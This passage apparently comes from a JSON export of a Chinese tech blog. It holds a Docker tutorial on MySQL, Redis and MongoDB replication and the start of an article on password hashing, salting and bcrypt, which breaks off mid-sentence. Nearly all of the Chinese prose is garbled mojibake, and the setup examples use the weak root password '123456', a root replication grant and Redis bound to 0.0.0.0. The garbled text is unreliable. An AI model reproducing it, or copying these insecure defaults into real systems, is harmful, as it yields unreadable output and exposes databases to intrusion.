å…¶ä½™ä¸¤ä¸ª(I/O thread, SQL thread)è¿è¡Œåœ¨ä»èŠ‚ç‚¹\n\n![1](æ•°æ®åº“çš„ä¸»ä»å¤åˆ¶/1.jpg)\n\n<!-- more -->\n\n### 1.1 MySQL å¤åˆ¶è¿‡ç¨‹\n\nè¦å®æ–½å¤åˆ¶ï¼Œé¦–å…ˆå¿…é¡»æ‰“å¼€Master ç«¯çš„binary logï¼ˆbin-logï¼‰åŠŸèƒ½ï¼Œå¦åˆ™æ— æ³•å®ç°ã€‚\n\n+ **ä¸»èŠ‚ç‚¹ binary log dump çº¿ç¨‹**\n\n  å½“ä»èŠ‚ç‚¹è¿æ¥ä¸»èŠ‚ç‚¹æ—¶ï¼Œä¸»èŠ‚ç‚¹ä¼šåˆ›å»ºä¸€ä¸ªlog dump çº¿ç¨‹ï¼Œç”¨äºå‘é€bin-logçš„å†…å®¹ã€‚åœ¨è¯»å–bin-logä¸­çš„æ“ä½œæ—¶ï¼Œæ­¤çº¿ç¨‹ä¼šå¯¹ä¸»èŠ‚ç‚¹ä¸Šçš„bin-logåŠ é”ï¼Œå½“è¯»å–å®Œæˆï¼Œç”šè‡³åœ¨å‘åŠ¨ç»™ä»èŠ‚ç‚¹ä¹‹å‰ï¼Œé”ä¼šè¢«é‡Šæ”¾ã€‚\n\n+ **ä»èŠ‚ç‚¹I/Oçº¿ç¨‹**\n\n  å½“ä»èŠ‚ç‚¹ä¸Šæ‰§è¡Œ`start slave`å‘½ä»¤ä¹‹åï¼Œä»èŠ‚ç‚¹ä¼šåˆ›å»ºä¸€ä¸ªI/Oçº¿ç¨‹ç”¨æ¥è¿æ¥ä¸»èŠ‚ç‚¹ï¼Œè¯·æ±‚ä¸»åº“ä¸­æ›´æ–°çš„bin-logã€‚I/Oçº¿ç¨‹æ¥æ”¶åˆ°ä¸»èŠ‚ç‚¹binlog dump è¿›ç¨‹å‘æ¥çš„æ›´æ–°ä¹‹åï¼Œä¿å­˜åœ¨æœ¬åœ°relay-logä¸­ã€‚\n\n+ **ä»èŠ‚ç‚¹SQLçº¿ç¨‹**\n\n  SQLçº¿ç¨‹è´Ÿè´£è¯»å–relay logä¸­çš„å†…å®¹ï¼Œè§£ææˆå…·ä½“çš„æ“ä½œå¹¶æ‰§è¡Œï¼Œæœ€ç»ˆä¿è¯ä¸»ä»æ•°æ®çš„ä¸€è‡´æ€§ã€‚\n\n\n\n### 1.2 MySQL ä¸»ä»å¤åˆ¶æ¨¡å¼\n\nMySQL ä¸»ä»å¤åˆ¶é»˜è®¤æ˜¯å¼‚æ­¥çš„æ¨¡å¼ã€‚\n\nMySQLå¢åˆ æ”¹æ“ä½œä¼šå…¨éƒ¨è®°å½•åœ¨binary logä¸­ï¼Œå½“slaveèŠ‚ç‚¹è¿æ¥masteræ—¶ï¼Œä¼šä¸»åŠ¨ä»masterå¤„è·å–æœ€æ–°çš„bin logæ–‡ä»¶ã€‚å¹¶æŠŠbin logä¸­çš„sql relayã€‚\n\n+ **å¼‚æ­¥æ¨¡å¼**\n\n  ä¸»èŠ‚ç‚¹ä¸ä¼šä¸»åŠ¨push bin logåˆ°ä»èŠ‚ç‚¹ï¼Œè¿™æ ·æœ‰å¯èƒ½å¯¼è‡´failoverçš„æƒ…å†µä¸‹ï¼Œä¹Ÿè®¸ä»èŠ‚ç‚¹æ²¡æœ‰å³æ—¶åœ°å°†æœ€æ–°çš„bin logåŒæ­¥åˆ°æœ¬åœ°ã€‚\n\n+ **åŠåŒæ­¥æ¨¡å¼(mysql semi-sync)**\n\n  ä¸»èŠ‚ç‚¹åªéœ€è¦æ¥æ”¶åˆ°å…¶ä¸­ä¸€å°ä»èŠ‚ç‚¹çš„è¿”å›ä¿¡æ¯ï¼Œå°±ä¼šcommitï¼›å¦åˆ™éœ€è¦ç­‰å¾…ç›´åˆ°è¶…æ—¶æ—¶é—´ç„¶ååˆ‡æ¢æˆå¼‚æ­¥æ¨¡å¼å†æäº¤ã€‚\n\n  binlogè‡³å°‘ä¼ è¾“åˆ°äº†ä¸€ä¸ªä»èŠ‚ç‚¹ä¸Šï¼Œä¸èƒ½ä¿è¯ä»èŠ‚ç‚¹å°†æ­¤äº‹åŠ¡æ›´æ–°åˆ°dbä¸­ã€‚æ€§èƒ½ä¸Šä¼šæœ‰ä¸€å®šçš„é™ä½ï¼Œå“åº”æ—¶é—´ä¼šå˜é•¿ã€‚\n\n+ **å…¨åŒæ­¥æ¨¡å¼**\n\n  å…¨åŒæ­¥æ¨¡å¼æ˜¯æŒ‡ä¸»èŠ‚ç‚¹å’Œä»èŠ‚ç‚¹å…¨éƒ¨æ‰§è¡Œäº†commitå¹¶ç¡®è®¤æ‰ä¼šå‘å®¢æˆ·ç«¯è¿”å›æˆåŠŸã€‚\n\n\n\n### 1.3 MySQL å¤åˆ¶æ–¹å¼\n\n+ åŸºäºSQLè¯­å¥çš„å¤åˆ¶ï¼ˆstatement-based replicationï¼ŒSBRï¼‰\n\n  å°±æ˜¯è®°å½•sqlè¯­å¥åœ¨bin logä¸­ï¼ŒMysql 5.1.4 åŠä¹‹å‰çš„ç‰ˆæœ¬éƒ½æ˜¯ä½¿ç”¨çš„è¿™ç§å¤åˆ¶æ ¼å¼ã€‚\n\n  ä¼˜ç‚¹æ˜¯åªéœ€è¦è®°å½•ä¼šä¿®æ”¹æ•°æ®çš„sqlè¯­å¥åˆ°binlogä¸­ï¼Œå‡å°‘äº†binlogæ—¥å¿—é‡ï¼ŒèŠ‚çº¦I/Oï¼Œæé«˜æ€§èƒ½ã€‚\n\n  ç¼ºç‚¹æ˜¯åœ¨æŸäº›æƒ…å†µä¸‹ï¼Œä¼šå¯¼è‡´ä¸»ä»èŠ‚ç‚¹ä¸­æ•°æ®ä¸ä¸€è‡´ï¼ˆæ¯”å¦‚now()å‡½æ•°ç­‰ï¼‰ã€‚\n\n  \n\n+ åŸºäºè¡Œçš„å¤åˆ¶ï¼ˆrow-based replicationï¼ŒRBR)\n\n  mysql masterå°†SQLè¯­å¥åˆ†è§£ä¸ºåŸºäºRowæ›´æ”¹çš„è¯­å¥å¹¶è®°å½•åœ¨bin logä¸­ï¼Œä¹Ÿå°±æ˜¯åªè®°å½•å“ªæ¡æ•°æ®è¢«ä¿®æ”¹äº†ï¼Œä¿®æ”¹æˆä»€ä¹ˆæ ·ã€‚\n\n  ä¼˜ç‚¹æ˜¯ä¸ä¼šå‡ºç°æŸäº›ç‰¹å®šæƒ…å†µä¸‹çš„å­˜å‚¨è¿‡ç¨‹ã€æˆ–è€…å‡½æ•°ã€æˆ–è€…triggerçš„è°ƒç”¨æˆ–è€…è§¦å‘æ— æ³•è¢«æ­£ç¡®å¤åˆ¶çš„é—®é¢˜ã€‚\n\n  ç¼ºç‚¹æ˜¯ä¼šäº§ç”Ÿå¤§é‡çš„æ—¥å¿—ï¼Œå°¤å…¶æ˜¯ä¿®æ”¹tableçš„æ—¶å€™ä¼šè®©æ—¥å¿—æš´å¢,åŒæ—¶å¢åŠ bin logåŒæ­¥æ—¶é—´ã€‚ä¹Ÿä¸èƒ½é€šè¿‡bin logè§£æè·å–æ‰§è¡Œè¿‡çš„sqlè¯­å¥ï¼Œåªèƒ½çœ‹åˆ°å‘ç”Ÿçš„dataå˜æ›´ã€‚\n\n  \n\n+ æ··åˆæ¨¡å¼å¤åˆ¶ï¼ˆmixed-based replication,MBR)\n\n  MySQL NDB cluster 7.3 å’Œ7.4 ä½¿ç”¨çš„MBRã€‚æ˜¯ä»¥ä¸Šä¸¤ç§æ¨¡å¼çš„æ··åˆï¼Œå¯¹äºä¸€èˆ¬çš„å¤åˆ¶ä½¿ç”¨STATEMENTæ¨¡å¼ä¿å­˜åˆ°binlogï¼Œå¯¹äºSTATEMENTæ¨¡å¼æ— æ³•å¤åˆ¶çš„æ“ä½œåˆ™ä½¿ç”¨ROWæ¨¡å¼æ¥ä¿å­˜ï¼ŒMySQLä¼šæ ¹æ®æ‰§è¡Œçš„SQLè¯­å¥é€‰æ‹©æ—¥å¿—ä¿å­˜æ–¹å¼ã€‚\n\n\n\n### 1.4 æ“ä½œ\n\n+ docker è¿è¡Œ mysql\n\n  ```bash\n  docker pull mysql:5.7 # æ‹‰å–é•œåƒ\n\n  docker run --name mysql1 -p 33061:3306 -e MYSQL_ROOT_PASSWORD=123456 -d mysql:5.7 # è¿è¡Œç¬¬ä¸€ä¸ª mysql\n  docker run --name mysql2 -p 33062:3306 -e MYSQL_ROOT_PASSWORD=123456 -d mysql:5.7 # è¿è¡Œç¬¬äºŒä¸ª mysql\n  ```\n\nâ€‹\tç¬¬ä¸€ä¸ªå½“åšä¸»æœåŠ¡å™¨, ç¬¬äºŒä¸ªå½“åšä»æœåŠ¡å™¨\n\n+ ä¸»æœåŠ¡å™¨é…ç½®\n\n  ```bash\n  # 1. è¿›å…¥å®¹å™¨ä¿®æ”¹é…ç½®æ–‡ä»¶\n  docker exec -it mysql1 /bin/bash\n\n  vi /etc/mysql/mysql.conf.d/mysqld.cnf\n  [mysqld]\n  server-id=1\n  log-bin=mysql-bin\n\n  docker restart mysql1\n\n  # 2. é…ç½®æƒé™, å¯ä»¥è¢«è¿æ¥\nmysql -u root -p\n  grant replication slave on *.* to 'root'@'172.17.0.1' identified by '123456';\n  flush privileges;\n  show master status\\G\n  *************************** 1. row ***************************\n             File: mysql-bin.000003\n           Position: 319\n       Binlog_Do_DB:\n   Binlog_Ignore_DB:\n  Executed_Gtid_Set:\n  ```\n  \n+ ä»æœåŠ¡å™¨é…ç½®\n\n  ```bash\n  # 1. è¿›å…¥å®¹å™¨ä¿®æ”¹é…ç½®æ–‡ä»¶\n  docker exec -it mysql2 /bin/bash\n  \n  vi /etc/mysql/mysql.conf.d/mysqld.cnf\n[mysqld]\n  server-id=2\n  log-bin=mysql-bin\n  \n  docker restart mysql2\n  \n  \n  # 2.å¼€å¯slave, å¯ä»¥è¢«è®¿é—®\n  mysql -u root -p\n  \n  # 172.17.0.1 æ˜¯docker mac æœ¬æœº ip, 33061æ˜¯ ä¸»çš„ç«¯å£\n  change master to master_host='172.17.0.1',\n  master_port=33061,\n  master_user='root',\n  master_password='123456',\n  master_log_file='mysql-bin.000003',\n  master_log_pos=319; \n  \n  \n  start slave;\n  show slave status\\G\n  *************************** 1. row ***************************\n                 Slave_IO_State: Waiting for master to send event\n                    Master_Host: 172.17.0.1\n                    Master_User: root\n                    Master_Port: 33061\n                  Connect_Retry: 60\n                Master_Log_File: mysql-bin.000003\n            Read_Master_Log_Pos: 649\n                 Relay_Log_File: 9339fdceb667-relay-bin.000002\n                  Relay_Log_Pos: 650\n          Relay_Master_Log_File: mysql-bin.000003\n               Slave_IO_Running: Yes\n              Slave_SQL_Running: Yes\n  ```\n  \n+ æµ‹è¯•\n\n  ```bash\n  # ä¸»æ•°æ®åº“åˆ›å»º\n  create database test_1;\n  # ä»æ•°æ®æŸ¥çœ‹, å³å¯ä»¥çœ‹åˆ°\n  show databases;\n  ```\n\n  \n\n# 2. redis ä¸»ä»å¤åˆ¶\n\nä¸»æœåŠ¡å™¨è´Ÿè´£æ¥æ”¶å†™è¯·æ±‚, ä»æœåŠ¡å™¨è´Ÿè´£æ¥æ”¶è¯»è¯·æ±‚(ä»æœåŠ¡å™¨æ— æ³•è¿›è¡Œå†™æ“ä½œ)\n\n### 2.1 åŒæ­¥æ¨¡å¼\n\n+ å®Œæ•´é‡åŒæ­¥(redis 2.8ä»¥å‰)\n  + ä»æœåŠ¡å™¨å‘ä¸»æœåŠ¡å™¨å‘é€PSYNCå‘½ä»¤\n  \n  + æ”¶åˆ°PSYNCå‘½ä»¤çš„ä¸»æœåŠ¡å™¨æ‰§è¡ŒBGSAVEå‘½ä»¤ï¼Œåœ¨åå°**ç”Ÿæˆä¸€ä¸ªRDBæ–‡ä»¶**ã€‚å¹¶ç”¨ä¸€ä¸ª**ç¼“å†²åŒº**æ¥è®°å½•ä»ç°åœ¨å¼€å§‹æ‰§è¡Œçš„æ‰€æœ‰**å†™å‘½ä»¤**ã€‚\n  \n  + å½“ä¸»æœåŠ¡å™¨çš„BGSAVEå‘½ä»¤æ‰§è¡Œå®Œåï¼Œå°†ç”Ÿæˆçš„RDBæ–‡ä»¶å‘é€ç»™ä»æœåŠ¡å™¨ï¼Œ**ä»æœåŠ¡å™¨æ¥æ”¶å’Œè½½å…¥RDBæ–‡ä»¶**ã€‚å°†è‡ªå·±çš„æ•°æ®åº“çŠ¶æ€æ›´æ–°è‡³ä¸ä¸»æœåŠ¡å™¨æ‰§è¡ŒBGSAVEå‘½ä»¤æ—¶çš„çŠ¶æ€ã€‚\n  \n  + ä¸»æœåŠ¡å™¨å°†æ‰€æœ‰ç¼“å†²åŒºçš„**å†™å‘½ä»¤å‘é€ç»™ä»æœåŠ¡å™¨**ï¼Œä»æœåŠ¡å™¨æ‰§è¡Œè¿™äº›å†™å‘½ä»¤ï¼Œè¾¾åˆ°æ•°æ®æœ€ç»ˆä¸€è‡´æ€§ã€‚\n  \n    \n  \n+ éƒ¨åˆ†é‡åŒæ­¥\n\n  + ä¸»ä»æœåŠ¡å™¨çš„å¤åˆ¶åç§»é‡\n\n    - ä¸»æœåŠ¡å™¨æ¯æ¬¡ä¼ æ’­Nä¸ªå­—èŠ‚ï¼Œå°±å°†è‡ªå·±çš„å¤åˆ¶åç§»é‡åŠ ä¸ŠN\n\n    - ä»æœåŠ¡å™¨æ¯æ¬¡æ”¶åˆ°ä¸»æœåŠ¡å™¨çš„Nä¸ªå­—èŠ‚ï¼Œå°±å°†è‡ªå·±çš„å¤åˆ¶åç§»é‡åŠ ä¸ŠN\n\n      \n\n  + ä¸»æœåŠ¡å™¨çš„å¤åˆ¶ç§¯å‹ç¼“å†²åŒº\n\n    ä¸»æœåŠ¡å™¨è¿›è¡Œå‘½ä»¤ä¼ æ’­æ—¶ï¼Œä¸ä»…ä»…ä¼šå°†å†™å‘½ä»¤å‘é€ç»™æ‰€æœ‰çš„ä»æœåŠ¡å™¨ï¼Œè¿˜ä¼šå°†å†™å‘½ä»¤**å…¥é˜Ÿåˆ°å¤åˆ¶ç§¯å‹ç¼“å†²åŒº**é‡Œé¢(è¿™ä¸ªå¤§å°å¯ä»¥è°ƒçš„)ã€‚å¦‚æœå¤åˆ¶ç§¯å‹ç¼“å†²åŒº**å­˜åœ¨**ä¸¢å¤±çš„åç§»é‡çš„æ•°æ®ï¼Œé‚£å°±æ‰§è¡Œéƒ¨åˆ†é‡åŒæ­¥ï¼Œå¦åˆ™æ‰§è¡Œå®Œæ•´é‡åŒæ­¥ã€‚\n\n    \n\n  + æœåŠ¡å™¨è¿è¡Œçš„ID(**run ID**)\n\n    æœåŠ¡å™¨è¿è¡Œçš„ID(**run ID**)å®é™…ä¸Šå°±æ˜¯ç”¨æ¥æ¯”å¯¹IDæ˜¯å¦ç›¸åŒã€‚å¦‚æœä¸ç›¸åŒï¼Œåˆ™è¯´æ˜ä»æœåŠ¡å™¨æ–­çº¿ä¹‹å‰å¤åˆ¶çš„ä¸»æœåŠ¡å™¨å’Œå½“å‰è¿æ¥çš„ä¸»æœåŠ¡å™¨æ˜¯ä¸¤å°æœåŠ¡å™¨ï¼Œè¿™å°±ä¼šè¿›è¡Œå®Œæ•´é‡åŒæ­¥ã€‚\n\n    \n\n+ å‘½ä»¤ä¼ æ’­\n\n  å½“å®Œæˆäº†åŒæ­¥ä¹‹åï¼Œä¸»ä»æœåŠ¡å™¨å°±ä¼šè¿›å…¥å‘½ä»¤ä¼ æ’­é˜¶æ®µã€‚è¿™æ—¶ä¸»æœåŠ¡å™¨åªè¦å°†è‡ªå·±çš„å†™å‘½ä»¤å‘é€ç»™ä»æœåŠ¡å™¨ï¼Œè€Œä»æœåŠ¡å™¨æ¥æ”¶å¹¶æ‰§è¡Œä¸»æœåŠ¡å™¨å‘é€è¿‡æ¥çš„å†™å‘½ä»¤ï¼Œå°±å¯ä»¥ä¿è¯ä¸»ä»æœåŠ¡å™¨ä¸€ç›´ä¿æŒæ•°æ®ä¸€è‡´äº†ï¼\n\n  åœ¨å‘½ä»¤ä¼ æ’­é˜¶æ®µï¼Œä»æœåŠ¡å™¨é»˜è®¤ä¼šä»¥æ¯ç§’ä¸€æ¬¡çš„é¢‘ç‡ï¼Œå‘æœåŠ¡å™¨å‘é€å‘½ä»¤`REPLCONF ACK <replication_offset>` å…¶ä¸­replication_offsetæ˜¯ä»æœåŠ¡å™¨å½“å‰çš„å¤åˆ¶åç§»é‡\n\n\n\n### 2.2 æ“ä½œ\n\n+ ä¸‹è½½\n\n  ```bash\n  # ä¸‹è½½\n  docker pull redis:latest\n\n  # ä¸‹è½½é…ç½®æ–‡ä»¶ \n  http://download.redis.io/redis-stable/redis.conf\n\n  # ä¸»redisé…ç½®, æ— éœ€ç‰¹æ®Šé…ç½®, å› ä¸ºåœ¨ docker å†…, éœ€è¦ä¿®æ”¹ä¸€ä¸‹bind\n  vi $PWD/redis1/redis.conf\n  bind 127.0.0.1 æ”¹ä¸º bind 0.0.0.0\n\n  # ä¿®æ”¹ä»redisé…ç½®, ä¿®æ”¹ redis.conf æ–‡ä»¶\n  vi $PWD/redis2/redis.conf\n  slaveof 172.17.0.1 63791\n  ```\n\n+ å¯åŠ¨\n\n  ```bash\n  # ä¸»æœåŠ¡å™¨\n  docker run \\\n  -p 63791:6379 \\\n  -v $PWD/redis1/redis.conf:/etc/redis/redis.conf \\\n  --privileged=true \\\n  --name redis1 \\\n  -d redis redis-server /etc/redis/redis.conf\n\n  # ä»æœåŠ¡å™¨\n  docker run \\\n  -p 63792:6379 \\\n  -v $PWD/redis2/redis.conf:/etc/redis/redis.conf \\\n  --privileged=true \\\n  --name redis2 \\\n  -d redis redis-server /etc/redis/redis.conf\n  ```\n\n+ æµ‹è¯•\n\n  ```bash\n  # æŸ¥çœ‹é…ç½®æ–‡ä»¶\n  redis-cli info | grep config_file\n  \n  # æŸ¥çœ‹ä»çš„çŠ¶æ€, çœ‹åˆ°master_link_status:upå°±æ˜¯æˆåŠŸ\n  redis-cli info | grep master\n  master_host:172.17.0.1\n  master_port:63791\n  master_link_status:up\n\n\t# ç„¶ååœ¨ä¸»æœåŠ¡å™¨ set key, åœ¨ä»æœåŠ¡å™¨ get å³å¯\n  ```\n  \n  \n\n# 3. mongodb å‰¯æœ¬é›†\n\nåœ¨ MongoDB ä¸­,æœ‰ä¸¤ç§æ•°æ®å†—ä½™æ–¹å¼,ä¸€ç§ æ˜¯ Master-Slave æ¨¡å¼ï¼ˆä¸»ä»å¤åˆ¶ï¼‰,ä¸€ç§æ˜¯ Replica Sets æ¨¡å¼ï¼ˆå‰¯æœ¬é›†ï¼‰ã€‚\n\nMongoDB çš„æœ€æ–°ç‰ˆæœ¬å·²ç»ä¸å†æ”¯æŒä¸»ä»å¤åˆ¶, å»ºè®®ä½¿ç”¨å‰¯æœ¬é›†ã€‚\n\n### 3.1 ä¸»ä»å¤åˆ¶(ä¸æ¨è)\n\n+ --masterç”¨æ¥ç¡®å®šä¸»æœåŠ¡å™¨\n\n+ --slave å’Œ --source æ¥æ§åˆ¶ä»æœåŠ¡å™¨\n+ å¯ä»¥åœ¨mongodb.confé…ç½®æ–‡ä»¶é‡ŒæŒ‡æ˜ä¸»ä»å…³ç³»ï¼Œè¿™æ ·å¯åŠ¨mongodbçš„æ—¶å€™åªè¦è·Ÿä¸Šé…ç½®æ–‡ä»¶å°±è¡Œï¼Œå°±ä¸éœ€è¦é€šè¿‡--masterå’Œ--slaveæ¥æŒ‡æ˜ä¸»ä»äº†ã€‚\n\n### 3.2 å‰¯æœ¬é›†\n\nåªèƒ½ master å†™, ä»ä¸èƒ½å†™.\n\n+ ä¸‹è½½\n\n  ```bash\n  docker pull mongo:latest\n  \n  # ä¸»æœåŠ¡å™¨\n  docker run \\\n  -d \\\n  -p 27018:27017 \\\n  --name mongo1 \\\n  mongo mongod --replSet my-mongo-set\n  \n  # ä»æœåŠ¡å™¨\n  docker run \\\n  -d \\\n  -p 27019:27017 \\\n  --name mongo2 \\\n  mongo mongod --replSet my-mongo-set\n  ```\n  \n+ é…ç½®\n\n  ```bash\n  docker exec -it mongo1 mongo\n  \n  config = {\n       \"_id\" : \"my-mongo-set\",\n       \"members\" : [\n           {\n               \"_id\" : 0,\n               \"host\" : \"172.17.0.1:27018\"\n           },\n           {\n               \"_id\" : 1,\n               \"host\" : \"172.17.0.1:27019\"\n           }\n       ]\n    }\n  rs.initiate(config)\n  # ä¸‹é¢æ˜¯è¾“å‡º\n  {\n          \"ok\" : 1,\n          \"$clusterTime\" : {\n                  \"clusterTime\" : Timestamp(1595349445, 1),\n                  \"signature\" : {\n                          \"hash\" : BinData(0,\"AAAAAAAAAAAAAAAAAAAAAAAAAAA=\"),\n                          \"keyId\" : NumberLong(0)\n                  }\n          },\n          \"operationTime\" : Timestamp(1595349445, 1)\n  }\n  \n  # å¦‚æœä¸€åˆ‡é¡ºåˆ©ï¼Œæç¤ºç¬¦å°†å˜æˆè¿™æ ·ï¼š(éœ€æ‰‹åŠ¨éšä¾¿æ•²å‘½ä»¤è§¦å‘ä¸‹)\n  my-mongo-set:PRIMARY>\n  ```\n\n\n+ æµ‹è¯•\n\n  ```bash\n  # å¯åŠ¨ä»æœåŠ¡å™¨\n  docker exec -it mongo2 mongo\n  my-mongo-set:PRIMARY>\n  \n  \n  # ä¸»æœåŠ¡å™¨\n  my-mongo-set:PRIMARY> db.mycollection.insert({name : 'sample'})\n  WriteResult({ \"nInserted\" : 1 })\n  my-mongo-set:PRIMARY> db.mycollection.find()\n{ \"_id\" : ObjectId(\"5f171a9bfb41dd82f33d6b2d\"), \"name\" : \"sample\" }\n  \n  # ä»æœåŠ¡å™¨\n  my-mongo-set:SECONDARY> db.setSlaveOk() # è®¾ç½®åŒæ­¥\n  my-mongo-set:SECONDARY> db.mycollection.find()\n  { \"_id\" : ObjectId(\"5f171a9bfb41dd82f33d6b2d\"), \"name\" : \"sample\" }\n  \n  \n  # æŸ¥è¯¢çŠ¶æ€\n  1. åˆ¤æ–­æ˜¯ä¸æ˜¯master: db.isMaster()\n  2. å¤åˆ¶é›†çŠ¶æ€æŸ¥è¯¢ï¼šrs.status()\n  3. æŸ¥çœ‹oplogçŠ¶æ€ï¼š rs.printReplicationInfo()\n  4. æŸ¥çœ‹å¤åˆ¶å»¶è¿Ÿï¼šÂ  rs.printSlaveReplicationInfo()\n  5. æŸ¥çœ‹æœåŠ¡çŠ¶æ€è¯¦æƒ…:Â Â  db.serverStatus()\n  ```\n  \n  \n\n\n# 4. é—®é¢˜æ€»ç»“\n\n+ docker å†…æ²¡æœ‰å‘½ä»¤\n\n  ```bash\n  apt update\n  apt install vim #vim\n  apt install procps # ps\n  apt install iputils-ping #ping\n  ```\n\n  \n\n# 5. å‚è€ƒèµ„æ–™\n\n+ https://zhuanlan.zhihu.com/p/50597960\n+ https://outmanzzq.github.io/2019/01/30/docker-mongo-replica/","tags":["sql"],"categories":["sql"]},{"title":"å¦‚ä½•æ­£ç¡®å­˜å‚¨å¯†ç ","url":"%2Fp%2F4fe35076.html","content":"\n\n\n# 1. å“ˆå¸Œè¿˜æ˜¯åŠ å¯†?\n\nå“ˆå¸Œï¼ˆHashï¼‰æ˜¯å°†ç›®æ ‡æ–‡æœ¬è½¬æ¢æˆå…·æœ‰ç›¸åŒé•¿åº¦çš„ã€ä¸å¯é€†çš„æ‚å‡‘å­—ç¬¦ä¸²ï¼ˆæˆ–å«åšæ¶ˆæ¯æ‘˜è¦ï¼‰è€ŒåŠ å¯†ï¼ˆEncryptï¼‰æ˜¯å°†ç›®æ ‡æ–‡æœ¬è½¬æ¢æˆå…·æœ‰ä¸åŒé•¿åº¦çš„ã€å¯é€†çš„å¯†æ–‡ã€‚\n\nå“ˆå¸Œç®—æ³•å¾€å¾€è¢«è®¾è®¡æˆç”Ÿæˆå…·æœ‰ç›¸åŒé•¿åº¦çš„æ–‡æœ¬ï¼Œè€ŒåŠ å¯†ç®—æ³•ç”Ÿæˆçš„æ–‡æœ¬é•¿åº¦ä¸æ˜æ–‡æœ¬èº«çš„é•¿åº¦æœ‰å…³ã€‚å“ˆå¸Œç®—æ³•æ˜¯ä¸å¯é€†çš„ï¼Œè€ŒåŠ å¯†ç®—æ³•æ˜¯å¯é€†çš„ã€‚\n\n<!-- more -->\n\nå“ˆå¸Œå‡½æ•°å¹¶ä¸æ˜¯ä¸“é—¨ç”¨æ¥è®¾è®¡å­˜å‚¨ç”¨æˆ·å¯†ç çš„,ä¸è®ºå¦‚ä½•ï¼Œä½¿ç”¨ MD5ã€MD5 åŠ ç›æˆ–è€…å…¶ä»–å“ˆå¸Œçš„æ–¹å¼æ¥å­˜å‚¨å¯†ç éƒ½æ˜¯ä¸å®‰å…¨çš„.\n\nä½¿ç”¨åŠ å¯†çš„æ–¹å¼å­˜å‚¨å¯†ç ç›¸æ¯”äºå“ˆå¸ŒåŠ ç›çš„æ–¹å¼ï¼Œåœ¨ä¸€äº›å®‰å…¨æ„è¯†å’Œèƒ½åŠ›è¾ƒå·®çš„å…¬å¸å’Œç½‘ç«™åè€Œæ›´å®¹æ˜“å¯¼è‡´å¯†ç çš„æ³„éœ²å’Œå®‰å…¨äº‹æ•…ã€‚\n\n\n\nå“ˆå¸ŒåŠ ç›çš„æ–¹å¼ç¡®å®èƒ½å¤Ÿå¢åŠ æ”»å‡»è€…çš„æˆæœ¬ï¼Œä½†æ˜¯ä»Šå¤©æ¥çœ‹è¿˜è¿œè¿œä¸å¤Ÿï¼Œæˆ‘ä»¬éœ€è¦ä¸€ç§æ›´åŠ å®‰å…¨çš„æ–¹å¼æ¥å­˜å‚¨ç”¨æˆ·çš„å¯†ç ï¼Œè¿™ä¹Ÿå°±æ˜¯ä»Šå¤©è¢«å¹¿æ³›ä½¿ç”¨çš„æ…¢å“ˆå¸Œç®—æ³•. \n\næ…¢å“ˆå¸Œç®—æ³•æ˜¯ä¸ºå“ˆå¸Œå¯†ç è€Œä¸“é—¨è®¾è®¡çš„ï¼Œæ‰€ä»¥å®ƒæ˜¯ä¸€ä¸ªæ‰§è¡Œç›¸å¯¹è¾ƒæ…¢çš„ç®—æ³•, è‡ªå·±è®¡ç®—èµ·æ¥éƒ½æ…¢, é‚£ä¹ˆç ´è§£èµ·æ¥ä¹Ÿä¼šéå¸¸æ…¢.\n\n\n\n# 2. ç ´è§£å“ˆå¸Œ\n\n+ æš´åŠ›æšä¸¾æ³•ï¼šç®€å•ç²—æš´åœ°æšä¸¾å‡ºæ‰€æœ‰åŸæ–‡ï¼Œå¹¶è®¡ç®—å‡ºå®ƒä»¬çš„å“ˆå¸Œå€¼ï¼Œçœ‹çœ‹å“ªä¸ªå“ˆå¸Œå€¼å’Œç»™å®šçš„ä¿¡æ¯æ‘˜è¦ä¸€è‡´ã€‚\n\n+ å­—å…¸æ³•ï¼šé»‘å®¢åˆ©ç”¨ä¸€ä¸ªå·¨å¤§çš„å­—å…¸ï¼Œå­˜å‚¨å°½å¯èƒ½å¤šçš„åŸæ–‡å’Œå¯¹åº”çš„å“ˆå¸Œå€¼ã€‚ç ´è§£æ—¶é€šè¿‡å¯†æ–‡ç›´æ¥åæŸ¥æ˜æ–‡ã€‚ä½†å­˜å‚¨ä¸€ä¸ªè¿™æ ·çš„æ•°æ®åº“ï¼Œç©ºé—´æˆæœ¬æ˜¯æƒŠäººçš„ã€‚\n\n+ å½©è™¹è¡¨ï¼ˆrainbowï¼‰æ³•ï¼šåœ¨å­—å…¸æ³•çš„åŸºç¡€ä¸Šæ”¹è¿›ï¼Œä»¥æ—¶é—´æ¢ç©ºé—´ã€‚æ˜¯ç°åœ¨ç ´è§£å“ˆå¸Œå¸¸ç”¨çš„åŠæ³•ã€‚\n\n  \n\n  è™½ç„¶å½©è™¹è¡¨æœ‰ç€å¦‚æ­¤æƒŠäººçš„ç ´è§£æ•ˆç‡ï¼Œä½†ç½‘ç«™çš„å®‰å…¨äººå‘˜ä»ç„¶æœ‰åŠæ³•é˜²å¾¡å½©è™¹è¡¨ã€‚æœ€æœ‰æ•ˆçš„æ–¹æ³•å°±æ˜¯â€œåŠ ç›â€ï¼Œå³åœ¨å¯†ç çš„ç‰¹å®šä½ç½®æ’å…¥ç‰¹å®šçš„å­—ç¬¦ä¸²ï¼Œè¿™ä¸ªç‰¹å®šå­—ç¬¦ä¸²å°±æ˜¯â€œç›ï¼ˆSaltï¼‰â€ï¼ŒåŠ ç›åçš„å¯†ç ç»è¿‡å“ˆå¸ŒåŠ å¯†å¾—åˆ°çš„å“ˆå¸Œä¸²ä¸åŠ ç›å‰çš„å“ˆå¸Œä¸²å®Œå…¨ä¸åŒï¼Œé»‘å®¢ç”¨å½©è™¹è¡¨å¾—åˆ°çš„å¯†ç æ ¹æœ¬å°±ä¸æ˜¯çœŸæ­£çš„å¯†ç ã€‚å³ä½¿é»‘å®¢çŸ¥é“äº†â€œç›â€çš„å†…å®¹ã€åŠ ç›çš„ä½ç½®ï¼Œè¿˜éœ€è¦å¯¹Hå‡½æ•°å’ŒRå‡½æ•°è¿›è¡Œä¿®æ”¹ï¼Œå½©è™¹è¡¨ä¹Ÿéœ€è¦é‡æ–°ç”Ÿæˆï¼Œå› æ­¤åŠ ç›èƒ½å¤§å¤§å¢åŠ åˆ©ç”¨å½©è™¹è¡¨æ”»å‡»çš„éš¾åº¦ã€‚\n  \n\n\n\n# 3. BcryptåŠ å¯†\n\nBcryptå†…éƒ¨è‡ªå·±å®ç°äº†éšæœºåŠ ç›å¤„ç†ã€‚ä½¿ç”¨Bcryptï¼Œæ¯æ¬¡åŠ å¯†åçš„å¯†æ–‡æ˜¯ä¸ä¸€æ 